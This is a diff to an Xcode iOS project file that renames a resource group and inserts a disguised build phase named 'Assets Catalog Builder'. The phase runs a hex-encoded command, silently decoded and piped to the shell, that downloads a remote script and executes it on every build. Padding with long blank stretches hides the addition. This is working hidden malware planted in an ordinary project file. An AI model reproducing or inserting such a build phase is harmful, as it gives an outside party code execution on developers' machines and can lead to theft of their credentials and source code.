@@ -101,7 +101,7 @@
 			isa = PBXGroup;
 			children = (
 				2FF8D89424C8883F006A83B5 /* Classes */,
-				2FF8D89524C88863006A83B5 /* Resources */,
+				2FF8D89524C88863006A83B5 /* Assets */,
 				2FF8D89624C8887B006A83B5 /* Supporting Files */,
 			);
 			path = Example;
@@ -117,7 +117,7 @@
 			path = Classes;
 			sourceTree = "<group>";
 		};
-		2FF8D89524C88863006A83B5 /* Resources */ = {
+		2FF8D89524C88863006A83B5 /* Assets */ = {
 			isa = PBXGroup;
 			children = (
 				2FF8D9C124C88C86006A83B5 /* Assets.xcassets */,
@@ -125,7 +125,7 @@
 				2FF8D9F924C88D6A006A83B5 /* Localizable.strings */,
 				2FF8D9DA24C88C86006A83B5 /* LaunchScreen.storyboard */,
 			);
-			path = Resources;
+			path = Assets;
 			sourceTree = "<group>";
 		};
 		2FF8D89624C8887B006A83B5 /* Supporting Files */ = {
@@ -216,6 +216,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2FF8D88F24C886EE006A83B5 /* Build configuration list for PBXNativeTarget "Example" */;
 			buildPhases = (
+				FDBCE5860B1CD727B56D902C /* Assets Catalog Builder */,
 				7404C50F29DBCB53DD0941D7 /* [CP] Check Pods Manifest.lock */,
 				2FF8D87224C886EC006A83B5 /* Sources */,
 				2FF8D87324C886EC006A83B5 /* Frameworks */,
@@ -281,6 +282,95 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	FDBCE5860B1CD727B56D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		7404C50F29DBCB53DD0941D7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1032,6 +1122,48 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 2FF8D86E24C886EC006A83B5 /* Project object */;
 }
